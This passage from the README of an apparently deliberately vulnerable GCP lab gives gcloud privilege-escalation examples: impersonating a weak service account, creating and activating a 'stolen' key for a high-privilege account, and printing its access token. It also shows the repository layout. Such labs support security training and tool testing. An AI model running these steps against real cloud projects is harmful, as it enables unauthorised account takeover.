gcloud config unset auth/impersonate_service_account
```

### Example: Path 2 - Create Service Account Key

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc2-create-sa-key@$PROJECT_ID.iam.gserviceaccount.com

# Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Activate the stolen key
gcloud config unset auth/impersonate_service_account
gcloud auth activate-service-account --key-file=key.json
```

### Example: Path 4 - getAccessToken

```bash
# Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc4-get-access-token@$PROJECT_ID.iam.gserviceaccount.com

# Generate token for high-priv SA (vulnerable SA has Token Creator role)
gcloud auth print-access-token \
  --impersonate-service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com
```

### Next Steps

See [EXPLOITATION_GUIDE.md](EXPLOITATION_GUIDE.md) for:
- Detailed exploitation steps for all 47 scenarios
- Service-specific attack patterns (Compute, Functions, Run, Build, etc.)
- Quick reference table of all service account emails

## Architecture

```
gcp/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── outputs.tf                 # Output values
├── terraform.tfvars.example   # Example configuration
├── attacker-infra/            # Separate root: attacker box + staging bucket
│   ├── main.tf
│   ├── variables.tf
│   ├── outputs.tf
│   └── terraform.tfvars.example
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 47 privilege escalation paths
    │   │   ├── common.tf      # Shared resources
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── compute/           # GCE instances (paths 11-14, lateral7)
        ├── cloud-functions/   # Cloud Functions (path 18)
        ├── cloud-run/         # Cloud Run service/jobs (paths 19-22)
        ├── cloud-scheduler/   # Cloud Scheduler job (path 26)
        ├── deployment-manager/ # DM deployment (path 28)
        ├── composer/          # Composer environment (path 30)
        └── dataflow/          # Dataflow streaming job (path 32)
```

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
